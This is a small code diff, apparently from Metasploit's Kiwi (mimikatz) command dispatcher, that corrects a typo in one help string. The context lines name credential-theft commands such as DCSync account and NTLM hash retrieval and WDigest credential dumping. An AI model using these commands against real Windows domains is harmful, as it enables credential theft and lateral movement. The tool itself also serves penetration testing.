@@ -57,7 +57,7 @@ class Console::CommandDispatcher::Kiwi
   #
   def commands
     {
-      'kiwi_cmd'              => 'Execute an arbitary mimikatz command (unparsed)',
+      'kiwi_cmd'              => 'Execute an arbitrary mimikatz command (unparsed)',
       'dcsync'                => 'Retrieve user account information via DCSync (unparsed)',
       'dcsync_ntlm'           => 'Retrieve user account NTLM hash, SID and RID via DCSync',
       'creds_wdigest'         => 'Retrieve WDigest creds (parsed)',
